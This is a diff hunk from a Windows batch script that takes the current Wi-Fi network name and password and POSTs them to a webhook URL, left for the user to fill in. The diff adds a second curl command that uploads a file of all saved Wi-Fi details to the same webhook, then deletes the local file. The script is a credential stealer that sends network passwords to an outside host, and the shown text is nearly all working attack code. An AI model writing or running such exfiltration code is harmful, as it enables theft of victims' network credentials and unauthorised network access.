@@ -40,7 +40,11 @@ rem echo current wifi password: %PASSWORD%
 set WEBHOOK_URL=REPLACE THIS WITH YOUR OWN WEBHOOK
 set MESSAGE=%SSID%:%PASSWORD%
 
+:: send details of currently using wifi
 curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%MESSAGE%\"}" %WEBHOOK_URL%
+
+:: send details of all record wifi
+curl -H "Content-Type: multipart/form-data" -F "file=@wifi_details.txt" %WEBHOOK_URL%
 
 :end
 del wifi_details.txt
